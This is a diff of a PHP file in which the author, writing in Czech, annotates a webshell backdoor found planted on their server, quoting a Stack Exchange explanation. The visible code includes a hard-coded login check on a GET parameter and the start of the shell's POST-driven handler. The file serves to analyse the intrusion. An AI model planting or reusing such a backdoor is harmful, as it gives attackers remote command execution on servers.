@@ -1,6 +1,7 @@
-<?php 
+<?php
+// Rozkodovani utoku a letme vysvetleni
 
-// neprisel jsem na to, jak se mi toto na server dostalo, stranka pouze vypisuje udaje z textovych souboru
+// neprisel jsem na to, jak se mi toto na server dostalo, protoze stranka pouze vypisuje udaje z textovych souboru
 // a nepracuje s zadnym vstupem uzivatele (var.1: utokem na jiny web; var.2: problemem serveru) 
 
 if($_GET["login"]=="iOfG2Y"){
@@ -22,13 +23,10 @@ if($_GET["login"]=="iOfG2Y"){
     //     }
 
 /*
-Vysvetleni z webu:
-https://security.stackexchange.com/questions/97647/what-is-this-url-injection-piece-of-code-mean
-
+Vysvetleni z webu: https://security.stackexchange.com/questions/97647/what-is-this-url-injection-piece-of-code-mean
 User: user45139 (THX)
 
 I searched further about your issue and I found that an attacker used an opensource webshell application to execute shell on your server in a variety of common scripting languages such as ASP,ASPX,PHP,JSP,PL and Python.
-
 A quick study of that script lead me to know that:
 
 $mujj = $_POST['x']; 
